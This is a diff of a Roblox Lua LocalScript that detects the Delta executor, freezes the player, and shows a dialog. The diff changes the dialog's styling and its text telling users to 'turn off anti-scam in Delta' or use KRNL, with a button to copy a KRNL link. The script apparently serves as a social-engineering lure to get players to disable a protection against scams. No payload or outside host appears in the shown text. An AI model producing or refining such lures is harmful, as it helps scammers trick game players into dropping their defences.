@@ -1,3 +1,15 @@
+--[[
+    Delta Executor Detection + Freeze Lock by Nelli (Recreated in Lua for Roblox)
+
+    This script aims to replicate the functionality and visual style of the
+    HTML UI for a Roblox environment. It detects if the script is running
+    on a "Delta" executor, and if so, applies a freeze effect and displays
+    a custom UI with a message and a copy button.
+
+    Note: This is a client-side script (LocalScript) and should be placed
+    in StarterPlayerScripts or PlayerGui.
+]]
+
 local Players = game:GetService("Players")
 local Lighting = game:GetService("Lighting")
 local UserInputService = game:GetService("UserInputService")
@@ -72,7 +84,7 @@ if executor:lower():find("delta") then
     mainFrame.Size = UDim2.new(0, 400, 0, 200) -- Fixed size like in HTML
     mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
     mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 36) -- Dark gray/black from green.png
+    mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40) -- Dark gray/black from akin.jpg
     mainFrame.BorderSizePixel = 0
     mainFrame.Parent = screenGui
 
@@ -81,10 +93,10 @@ if executor:lower():find("delta") then
     uiCorner.Parent = mainFrame
 
     local title = Instance.new("TextLabel")
-    title.Text = "⚠️ Executor Not Supported" -- Updated text from green.png
-    title.Font = Enum.Font.GothamBold -- Using GothamBold for emphasis
-    title.TextSize = 20 -- Slightly larger
-    title.TextColor3 = Color3.fromRGB(0, 255, 0) -- Bright green from green.png
+    title.Text = "Error Message" -- Reverted to "Error Message" from akin.jpg
+    title.Font = Enum.Font.Gotham -- Using Gotham
+    title.TextSize = 18 -- Reverted size
+    title.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text from akin.jpg
     title.BackgroundTransparency = 1
     title.Size = UDim2.new(1, -40, 0, 30)
     title.Position = UDim2.new(0, 20, 0, 10)
@@ -94,11 +106,11 @@ if executor:lower():find("delta") then
     title.Parent = mainFrame
 
     local messageText = Instance.new("TextLabel")
-    -- Removed "Closing in 59 seconds..." from the text
-    messageText.Text = "You're using an unsupported executor (Delta).\n\nTo fix:\n- Turn off anti-scam in Delta\n- Or use Krnl executor."
+    -- Reverted text content to match akin.jpg
+    messageText.Text = "Delta Executor detected.\n\nYou're using unsupported executor (Delta).\n\nTo fix this:\n• Turn off anti-scam in Delta\n• Or use KRNL instead!"
     messageText.Font = Enum.Font.Gotham
     messageText.TextSize = 12
-    messageText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White from green.png
+    messageText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White from akin.jpg
     messageText.BackgroundTransparency = 1
     messageText.Size = UDim2.new(1, -40, 0, 100)
     messageText.Position = UDim2.new(0, 20, 0, 40)
@@ -111,9 +123,9 @@ if executor:lower():find("delta") then
     local copyButton = Instance.new("TextButton")
     copyButton.Size = UDim2.new(0, 200, 0, 36)
     copyButton.Position = UDim2.new(0.5, -100, 1, -50)
-    copyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0) -- Green from green.png
+    copyButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100) -- Gray from akin.jpg
     copyButton.Text = "Copy Krnl Link"
-    copyButton.Font = Enum.Font.GothamBold -- Using GothamBold for button
+    copyButton.Font = Enum.Font.Gotham -- Using Gotham for button
     copyButton.TextSize = 16
     copyButton.TextColor3 = Color3.fromRGB(0, 0, 0) -- Black text for contrast
     copyButton.AutoButtonColor = true
